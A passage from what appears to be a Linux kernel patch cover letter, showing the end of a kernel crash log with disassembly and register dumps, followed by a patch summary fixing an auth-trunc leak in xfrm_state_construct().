  2c:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)=0D
  33:	83 e2 39             	and    $0x39,%edx=0D
  36:	83 fa 08             	cmp    $0x8,%edx=0D
  39:	75 de                	jne    0x19=0D
  3b:	e8 23 ff ff ff       	call   0xffffffffffffff63=0D
=0D
Code starting with the faulting instruction=0D
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=0D
   0:	5b                   	pop    %rbx=0D
   1:	c3                   	ret=0D
   2:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)=0D
   9:	83 e2 39             	and    $0x39,%edx=0D
   c:	83 fa 08             	cmp    $0x8,%edx=0D
   f:	75 de                	jne    0xffffffffffffffef=0D
  11:	e8 23 ff ff ff       	call   0xffffffffffffff39=0D
[  808.706933][ T2086] RSP: 002b:00007fffdc4f6030 EFLAGS: 00000202 ORIG_RAX=
: 000000000000002e=0D
[  808.707518][ T2086] RAX: ffffffffffffffda RBX: 00007dcca92aa740 RCX: 000=
07dcca933c687=0D
[  808.708057][ T2086] RDX: 0000000000000000 RSI: 00007fffdc4f6120 RDI: 000=
0000000000003=0D
[  808.708623][ T2086] RBP: 000000000000000a R08: 0000000000000000 R09: 000=
0000000000000=0D
[  808.709169][ T2086] R10: 0000000000000000 R11: 0000000000000202 R12: 000=
000000000000b=0D
[  808.709738][ T2086] R13: 00007fffdc4f60f0 R14: 00007fffdc4f6230 R15: 000=
07fffdc4f6120=0D
[  808.710305][ T2086]  </TASK>=0D
[  808.710803][ T2086] Kernel Offset: disabled=0D
[  808.711110][ T2086] Rebooting in 10 seconds..=0D
-----END crash log-----=0D
=0D
Best regards,=0D
Zihan Xi=0D
=0D
Zihan Xi (1):=0D
  xfrm: fix xfrm_state_construct() auth-trunc leak=0D
=0D
 net/xfrm/xfrm_user.c | 2 +-=0D
 1 file changed, 1 insertion(+), 1 deletion(-)=0D
=0D
-- =0D
2.43.0=0D
=0D
